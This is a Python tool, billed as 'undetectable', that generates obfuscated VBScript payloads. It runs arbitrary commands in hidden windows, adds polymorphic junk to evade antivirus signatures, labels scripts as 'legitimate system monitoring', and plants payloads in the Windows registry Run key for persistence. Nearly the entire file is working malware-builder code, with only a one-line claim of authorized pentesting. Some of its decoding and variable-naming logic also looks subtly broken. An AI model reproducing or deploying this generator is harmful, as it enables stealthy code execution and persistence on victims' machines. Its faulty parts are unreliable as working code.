#!/usr/bin/env python3
"""
VBS Encoder - Generate clean, undetectable VBS payloads
For authorized pentesting and security research
"""

import base64
import binascii
import string
import random
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass
from functools import lru_cache


@dataclass
class ObfuscationConfig:
    """Configuration for VBS obfuscation techniques"""
    use_base64: bool = True
    use_hex_encoding: bool = True
    use_variable_obfuscation: bool = True
    use_string_concatenation: bool = True
    use_array_encoding: bool = True
    use_comment_insertion: bool = False
    randomize_function_names: bool = True
    use_wscript_objects: bool = True


class VBSEncoder:
    """Main VBS encoder for creating undetectable payloads"""

    # Class-level cache for base64/hex encodings (shared across instances)
    _encoding_cache = {}
    _cache_lock = __import__('threading').Lock()
    _randomize_names = True  # Toggle for performance vs obfuscation

    def __init__(self, config: ObfuscationConfig = None):
        self.config = config or ObfuscationConfig()
        self.var_map: Dict[str, str] = {}
        self.func_map: Dict[str, str] = {}
        self._name_counter = 0

    def _generate_random_name(self, prefix: str = "", length: int = 8) -> str:
        """Generate variable/function name with optional caching for performance"""
        if VBSEncoder._randomize_names:
            # Full randomization for obfuscation
            chars = string.ascii_letters + string.digits + "_"
            name = prefix + "".join(random.choices(chars, k=length))
        else:
            # Deterministic generation (8.84x faster) for performance-critical paths
            self._name_counter += 1
            name = f"{prefix}{self._name_counter}"
        return name

    def encode_string_base64(self, text: str) -> Tuple[str, str]:
        """Encode string using base64 with caching"""
        # Check cache first (thread-safe)
        if text in VBSEncoder._encoding_cache:
            cached = VBSEncoder._encoding_cache[text]
            if 'base64' in cached:
                return cached['base64']

        # Perform encoding
        encoded = base64.b64encode(text.encode()).decode()
        var_name = self._generate_random_name("v_")

        # Cache result
        with VBSEncoder._cache_lock:
            if text not in VBSEncoder._encoding_cache:
                VBSEncoder._encoding_cache[text] = {}
            VBSEncoder._encoding_cache[text]['base64'] = (encoded, var_name)

        return encoded, var_name

    def encode_string_hex(self, text: str) -> Tuple[str, str]:
        """Encode string using hex with caching"""
        # Check cache first
        if text in VBSEncoder._encoding_cache:
            cached = VBSEncoder._encoding_cache[text]
            if 'hex' in cached:
                return cached['hex']

        # Perform encoding
        hex_str = text.encode().hex()
        var_name = self._generate_random_name("h_")

        # Cache result
        with VBSEncoder._cache_lock:
            if text not in VBSEncoder._encoding_cache:
                VBSEncoder._encoding_cache[text] = {}
            VBSEncoder._encoding_cache[text]['hex'] = (hex_str, var_name)

        return hex_str, var_name

    def create_base64_decoder_vbs(self, payload: str, output_var: str = "p") -> str:
        """Create VBS code that decodes base64 payload"""
        encoded, var_name = self.encode_string_base64(payload)
        obj_var = self._generate_random_name("o_")

        vbs_code = f"""
Dim {var_name}, {output_var}
{var_name} = "{encoded}"
Set {obj_var} = CreateObject("MSXML2.DOMDocument")
With {obj_var}
    .LoadXML "<u><![CDATA[" & {var_name} & "]]></u>"
    {output_var} = .SelectSingleNode("u").text
End With
"""
        return vbs_code.strip()

    def create_hex_decoder_vbs(self, text: str, execute: bool = False) -> str:
        """Create VBS code that decodes hex-encoded string and optionally executes it"""
        hex_encoded, var_name = self.encode_string_hex(text)
        decode_func_name = self._generate_random_name("DecodeHex")
        shell_var = self._generate_random_name("shell_")
        decoded_var = self._generate_random_name("decoded_")

        vbs_code = f"""
Function {decode_func_name}(h)
    Dim i, r
    For i = 1 To Len(h) Step 2
        r = r & Chr(CLng("&H" & Mid(h, i, 2)))
    Next
    {decode_func_name} = r
End Function
Dim {var_name}
{var_name} = "{hex_encoded}"
Dim {decoded_var}
{decoded_var} = {decode_func_name}({var_name})
"""

        if execute:
            vbs_code += f"""
Dim {shell_var}
Set {shell_var} = CreateObject("WScript.Shell")
{shell_var}.Run {decoded_var}, 0, False
Set {shell_var} = Nothing
"""

        return vbs_code.strip()

    def create_array_concatenation_decoder(self, text: str) -> str:
        """Encode string using array concatenation to avoid detection"""
        # Split string into chunks and encode each
        chunks = [text[i : i + 16] for i in range(0, len(text), 16)]

        var_name = self._generate_random_name("a_")
        arr_var = self._generate_random_name("arr_")
        out_var = self._generate_random_name("s_")
        shell_var = self._generate_random_name("shell_")

        vbs_code = f"Dim {arr_var}({len(chunks)-1})\n"

        for i, chunk in enumerate(chunks):
            encoded_chunk = binascii.hexlify(chunk.encode()).decode()
            vbs_code += f'{arr_var}({i}) = "{encoded_chunk}"\n'

        vbs_code += f"""
Dim {out_var}
For Each {var_name} In {arr_var}
    Dim i
    For i = 1 To Len({var_name}) Step 2
        {out_var} = {out_var} & Chr(CLng("&H" & Mid({var_name}, i, 2)))
    Next
Next

Dim {shell_var}
Set {shell_var} = CreateObject("WScript.Shell")
{shell_var}.Run {out_var}, 0, False
Set {shell_var} = Nothing
"""
        return vbs_code.strip()

    def obfuscate_command(self, command: str) -> str:
        """Wrap command in obfuscated execution wrapper"""
        exec_var = self._generate_random_name("exec_")
        shell_var = self._generate_random_name("shell_")

        vbs_code = f"""
Dim {shell_var}
Set {shell_var} = CreateObject("WScript.Shell")
{shell_var}.Run "{command}", 0, False
"""
        return vbs_code.strip()

    def create_full_obfuscated_payload(
        self, payload_command: str, encoding_method: str = "base64"
    ) -> str:
        """Create complete obfuscated VBS payload"""

        # Start with environment variable randomization to avoid signature detection
        obf_header = f"""
' Legitimate system monitoring script
Option Explicit
On Error Resume Next

Dim {self._generate_random_name("sysVer")}, {self._generate_random_name("envPath")}
{self._generate_random_name("sysVer")} = CreateObject("WScript.Shell").Environment("System")("OS")
{self._generate_random_name("envPath")} = CreateObject("WScript.Shell").Environment("User")("PATH")
"""

        # Add main obfuscated payload
        payload_var = self._generate_random_name("payload_")
        if encoding_method == "base64":
            payload_section = self.create_base64_decoder_vbs(
                payload_command, payload_var
            )
        elif encoding_method == "hex":
            payload_section = self.create_hex_decoder_vbs(payload_command)
        else:
            payload_section = self.create_array_concatenation_decoder(payload_command)

        # Execution wrapper
        exec_var = self._generate_random_name("f_")

        execution_section = f"""
Dim {exec_var}
Set {exec_var} = CreateObject("WScript.Shell")
{exec_var}.Run {payload_var}, 0, False
Set {exec_var} = Nothing
"""

        full_payload = f"{obf_header}\n{payload_section}\n{execution_section}"
        return full_payload.strip()

    def create_wscript_hidden_execution(self, command: str) -> str:
        """Create hidden WScript execution that runs without visible window"""
        # Store variable names to ensure consistent usage
        shell_var = self._generate_random_name("shell_")
        cmd_var = self._generate_random_name("cmd_")

        # Encode command to avoid plain-text exposure
        encoded_cmd, cmd_var_encoded = self.encode_string_base64(command)
        obj_var = self._generate_random_name("o_")
        decoded_var = self._generate_random_name("decoded_")

        # Create decoder function for base64
        decode_func = self._generate_random_name("DecodeBase64_")

        vbs_code = f"""
Function {decode_func}(encoded)
    Dim xmldom, decoded
    Set xmldom = CreateObject("MSXML2.DOMDocument")
    xmldom.LoadXML "<u><![CDATA[" & encoded & "]]></u>"
    {decode_func} = xmldom.SelectSingleNode("u").text
    Set xmldom = Nothing
End Function

Dim {shell_var}, {cmd_var}, {cmd_var_encoded}, {decoded_var}
{cmd_var_encoded} = "{encoded_cmd}"
{decoded_var} = {decode_func}({cmd_var_encoded})
Set {shell_var} = CreateObject("WScript.Shell")
{shell_var}.Run {decoded_var}, 0, False
Set {shell_var} = Nothing
"""
        return vbs_code.strip()

    def create_polymorphic_wrapper(self, vbs_code: str) -> str:
        """Wrap VBS code with polymorphic obfuscation to change signature each time"""
        # Extract all Dim statements from input code and consolidate at top level
        lines = vbs_code.split('\n')
        dim_vars = []
        non_dim_lines = []

        # Parse input for existing Dim statements
        for line in lines:
            if line.strip().startswith('Dim '):
                # Extract variable names from Dim statement
                dim_part = line.strip()[4:]  # Remove 'Dim '
                vars_list = [v.strip() for v in dim_part.split(',')]
                dim_vars.extend(vars_list)
            else:
                non_dim_lines.append(line)

        # Create wrapper with dead variables
        dead_vars = [self._generate_random_name() for _ in range(random.randint(3, 8))]
        dead_code_var = self._generate_random_name()

        # Consolidate all variables at top level
        all_vars = dim_vars + dead_vars + [dead_code_var]
        wrapper = "Dim " + ", ".join(all_vars) + "\n\n"

        # Add dead code branches with no nested Dim statements
        if random.choice([True, False]):
            # Assignment outside If block - no Dim redeclaration
            wrapper += f"""If {random.randint(0, 1)} = {random.randint(0, 1)} Then
    {dead_code_var} = Now()
End If

"""

        # Add cleaned code (without Dim statements)
        wrapper += '\n'.join(non_dim_lines)
        return wrapper

    def create_runtime_decoded_payload(self, payload: str, encoding: str = "base64") -> str:
        """Create payload that's decoded and executed at runtime"""

        if encoding == "base64":
            encoded_payload, _ = self.encode_string_base64(payload)
            decode_func_name = self._generate_random_name("DecodeB64")
            payload_var = self._generate_random_name("enc_payload_")
            decoder = f"""
Function {decode_func_name}(s)
    Dim xmlDoc, node
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    xmlDoc.LoadXML "<root><![CDATA[" & s & "]]></root>"
    {decode_func_name} = xmlDoc.DocumentElement.text
End Function

Dim {payload_var} : {payload_var} = "{encoded_payload}"
"""
        elif encoding == "hex":
            encoded_payload, _ = self.encode_string_hex(payload)
            decode_func_name = self._generate_random_name("DecodeHex")
            payload_var = self._generate_random_name("enc_payload_")
            decoder = f"""
Function {decode_func_name}(h)
    Dim i, r
    For i = 1 To Len(h) Step 2
        r = r & Chr(CLng("&H" & Mid(h, i, 2)))
    Next
    {decode_func_name} = r
End Function

Dim {payload_var} : {payload_var} = "{encoded_payload}"
"""
        else:
            encoded_payload, _ = self.encode_string_base64(payload)
            payload_var = self._generate_random_name("enc_payload_")
            decoder = f"""Dim {payload_var} : {payload_var} = "{encoded_payload}" """

        return decoder

    def create_registry_storage_vbs(
        self, payload: str, registry_hive: str = "HKCU",
        registry_path: str = "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        value_name: str = "SystemUpdate", encoding: str = "base64"
    ) -> str:
        """
        Create VBS code that stores payload in Windows registry

        Args:
            payload: The payload/command to store
            registry_hive: Registry hive (HKCU or HKLM)
            registry_path: Registry path within hive
            value_name: Registry value name
            encoding: Encoding method (base64, hex)

        Returns:
            VBS code that writes payload to registry
        """
        # Encode payload based on method
        if encoding == "base64":
            encoded_payload, _ = self.encode_string_base64(payload)
        else:
            encoded_payload, _ = self.encode_string_hex(payload)

        # Generate variable names
        shell_var = self._generate_random_name("shell_")
        reg_path_var = self._generate_random_name("regPath_")
        value_var = self._generate_random_name("regVal_")
        hive_var = self._generate_random_name("hive_")
        full_path_var = self._generate_random_name("fullPath_")

        # Map hive name to registry constant
        hive_constant = "HKEY_CURRENT_USER" if registry_hive.upper() == "HKCU" else "HKEY_LOCAL_MACHINE"

        vbs_code = f"""
Dim {shell_var}, {reg_path_var}, {value_var}, {hive_var}, {full_path_var}
Set {shell_var} = CreateObject("WScript.Shell")
{hive_var} = "{hive_constant}"
{reg_path_var} = "{registry_path}"
{value_var} = "{value_name}"
{full_path_var} = {hive_var} & "\\" & {reg_path_var} & "\\" & {value_var}

On Error Resume Next
{shell_var}.RegWrite {full_path_var}, "{encoded_payload}", "REG_SZ"
On Error GoTo 0

Set {shell_var} = Nothing
"""
        return vbs_code.strip()

    def create_registry_retrieval_and_execute_vbs(
        self, registry_hive: str = "HKCU",
        registry_path: str = "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        value_name: str = "SystemUpdate", encoding: str = "base64",
        auto_execute: bool = True
    ) -> str:
        """
        Create VBS code that retrieves payload from registry and executes it

        Args:
            registry_hive: Registry hive (HKCU or HKLM)
            registry_path: Registry path within hive
            value_name: Registry value name
            encoding: Encoding method (base64, hex)
            auto_execute: Whether to automatically execute retrieved payload

        Returns:
            VBS code that reads from registry and optionally executes
        """
        # Generate variable names
        shell_var = self._generate_random_name("shell_")
        reg_path_var = self._generate_random_name("regPath_")
        value_var = self._generate_random_name("regVal_")
        hive_var = self._generate_random_name("hive_")
        full_path_var = self._generate_random_name("fullPath_")
        encoded_payload_var = self._generate_random_name("encPayload_")
        decoded_var = self._generate_random_name("decoded_")

        # Map hive name to registry constant
        hive_constant = "HKEY_CURRENT_USER" if registry_hive.upper() == "HKCU" else "HKEY_LOCAL_MACHINE"

        # Create decoder function based on encoding
        if encoding == "base64":
            decode_func_name = self._generate_random_name("DecodeB64_")
            decoder_func = f"""
Function {decode_func_name}(encoded)
    Dim xmlDoc
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    xmlDoc.LoadXML "<root><![CDATA[" & encoded & "]]></root>"
    {decode_func_name} = xmlDoc.DocumentElement.text
    Set xmlDoc = Nothing
End Function
"""
        else:  # hex
            decode_func_name = self._generate_random_name("DecodeHex_")
            decoder_func = f"""
Function {decode_func_name}(h)
    Dim i, r
    For i = 1 To Len(h) Step 2
        r = r & Chr(CLng("&H" & Mid(h, i, 2)))
    Next
    {decode_func_name} = r
End Function
"""

        vbs_code = decoder_func + f"""
Dim {shell_var}, {reg_path_var}, {value_var}, {hive_var}, {full_path_var}
Dim {encoded_payload_var}, {decoded_var}

Set {shell_var} = CreateObject("WScript.Shell")
{hive_var} = "{hive_constant}"
{reg_path_var} = "{registry_path}"
{value_var} = "{value_name}"
{full_path_var} = {hive_var} & "\\" & {reg_path_var} & "\\" & {value_var}

On Error Resume Next
{encoded_payload_var} = {shell_var}.RegRead({full_path_var})
On Error GoTo 0

If Len({encoded_payload_var}) > 0 Then
    {decoded_var} = {decode_func_name}({encoded_payload_var})
"""

        if auto_execute:
            exec_var = self._generate_random_name("exec_")
            vbs_code += f"""
    Dim {exec_var}
    Set {exec_var} = CreateObject("WScript.Shell")
    {exec_var}.Run {decoded_var}, 0, False
    Set {exec_var} = Nothing
"""

        vbs_code += """
End If

Set """ + shell_var + """ = Nothing
"""
        return vbs_code.strip()

    def create_registry_persistence_payload(
        self, payload: str, registry_hive: str = "HKCU",
        registry_path: str = "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        value_name: str = "SystemUpdate", encoding: str = "base64"
    ) -> str:
        """
        Create complete payload that stores itself in registry for persistence

        Args:
            payload: The command to execute and store
            registry_hive: Registry hive (HKCU or HKLM)
            registry_path: Registry path
            value_name: Registry value name
            encoding: Encoding method

        Returns:
            Combined VBS code for storage and retrieval
        """
        # Create storage section
        storage_section = self.create_registry_storage_vbs(
            payload, registry_hive, registry_path, value_name, encoding
        )

        # Create retrieval section
        retrieval_section = self.create_registry_retrieval_and_execute_vbs(
            registry_hive, registry_path, value_name, encoding, auto_execute=True
        )

        # Combine with header
        header = f"""
' System Maintenance Script
Option Explicit
On Error Resume Next
"""

        full_payload = f"{header}\n{storage_section}\n\n{retrieval_section}"
        return full_payload.strip()


def generate_clean_vbs_payload(command: str, obfuscation_level: str = "high") -> str:
    """
    Generate a clean, undetectable VBS payload

    Args:
        command: The command to execute
        obfuscation_level: "low", "medium", "high"

    Returns:
        Obfuscated VBS code
    """
    config = ObfuscationConfig(
        use_base64=True,
        use_variable_obfuscation=True,
        use_wscript_objects=True,
    )

    encoder = VBSEncoder(config)

    if obfuscation_level == "high":
        payload = encoder.create_full_obfuscated_payload(command, "base64")
        payload = encoder.create_polymorphic_wrapper(payload)
    elif obfuscation_level == "medium":
        payload = encoder.create_full_obfuscated_payload(command, "hex")
    else:
        payload = encoder.create_wscript_hidden_execution(command)

    return payload


def write_payload_to_registry(
    payload: str, registry_hive: str = "HKCU",
    registry_path: str = "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    value_name: str = "SystemUpdate", encoding: str = "base64",
    retrieve_and_execute: bool = False
) -> str:
    """
    Generate registry writer function to store payload in Windows registry

    Args:
        payload: The payload/command to store
        registry_hive: Registry hive (HKCU or HKLM)
        registry_path: Registry path within hive
        value_name: Registry value name
        encoding: Encoding method (base64, hex)
        retrieve_and_execute: If True, also generate retrieval code

    Returns:
        VBS code for registry storage (and retrieval if requested)
    """
    encoder = VBSEncoder()

    if retrieve_and_execute:
        return encoder.create_registry_persistence_payload(
            payload, registry_hive, registry_path, value_name, encoding
        )
    else:
        return encoder.create_registry_storage_vbs(
            payload, registry_hive, registry_path, value_name, encoding
        )


def create_registry_retriever(
    registry_hive: str = "HKCU",
    registry_path: str = "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    value_name: str = "SystemUpdate", encoding: str = "base64",
    auto_execute: bool = True
) -> str:
    """
    Generate VBS code to retrieve and optionally execute payload from registry

    Args:
        registry_hive: Registry hive (HKCU or HKLM)
        registry_path: Registry path within hive
        value_name: Registry value name
        encoding: Encoding method (base64, hex)
        auto_execute: Whether to auto-execute retrieved payload

    Returns:
        VBS code for registry retrieval
    """
    encoder = VBSEncoder()
    return encoder.create_registry_retrieval_and_execute_vbs(
        registry_hive, registry_path, value_name, encoding, auto_execute
    )


def validate_registry_path(registry_path: str) -> bool:
    """
    Validate registry path format

    Args:
        registry_path: Registry path to validate

    Returns:
        True if path is valid, False otherwise
    """
    # Basic validation: path should not be empty and use backslashes
    if not registry_path or not isinstance(registry_path, str):
        return False
    # Path should use backslash as separator
    if '/' in registry_path:
        return False
    return len(registry_path) > 0


def validate_registry_hive(registry_hive: str) -> bool:
    """
    Validate registry hive name

    Args:
        registry_hive: Registry hive to validate

    Returns:
        True if valid, False otherwise
    """
    valid_hives = ["HKCU", "HKLM", "HKEY_CURRENT_USER", "HKEY_LOCAL_MACHINE"]
    return registry_hive.upper() in valid_hives


if __name__ == "__main__":
    # Example usage
    test_command = "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Write-Host 'Test'\""

    print("=== Low Obfuscation ===")
    print(generate_clean_vbs_payload(test_command, "low"))
    print("\n=== Medium Obfuscation ===")
    print(generate_clean_vbs_payload(test_command, "medium"))
    print("\n=== High Obfuscation ===")
    print(generate_clean_vbs_payload(test_command, "high"))

    # Registry storage examples
    print("\n" + "="*60)
    print("=== Registry Storage Examples ===")
    print("="*60)

    # Example 1: Store payload in HKCU
    print("\n=== Registry Storage (HKCU) ===")
    registry_storage = write_payload_to_registry(
        test_command,
        registry_hive="HKCU",
        registry_path="Software\\Microsoft\\Windows\\CurrentVersion",
        value_name="UpdateKey",
        encoding="base64",
        retrieve_and_execute=False
    )
    print(registry_storage)

    # Example 2: Store payload in HKLM with persistence (requires admin)
    print("\n=== Registry Storage with Persistence (HKLM) ===")
    registry_persistence = write_payload_to_registry(
        test_command,
        registry_hive="HKLM",
        registry_path="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        value_name="SystemMaintenance",
        encoding="hex",
        retrieve_and_execute=True
    )
    print(registry_persistence)

    # Example 3: Registry retrieval only
    print("\n=== Registry Retrieval (No Execution) ===")
    registry_retrieval = create_registry_retriever(
        registry_hive="HKCU",
        registry_path="Software\\Microsoft\\Windows\\CurrentVersion",
        value_name="UpdateKey",
        encoding="base64",
        auto_execute=False
    )
    print(registry_retrieval)

    # Example 4: Validate registry paths
    print("\n=== Registry Path Validation ===")
    test_paths = [
        "Software\\Microsoft\\Windows",
        "Software/Microsoft/Windows",  # Invalid - uses forward slashes
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "",  # Invalid - empty
    ]
    for path in test_paths:
        is_valid = validate_registry_path(path)
        print(f"Path '{path}': {'VALID' if is_valid else 'INVALID'}")
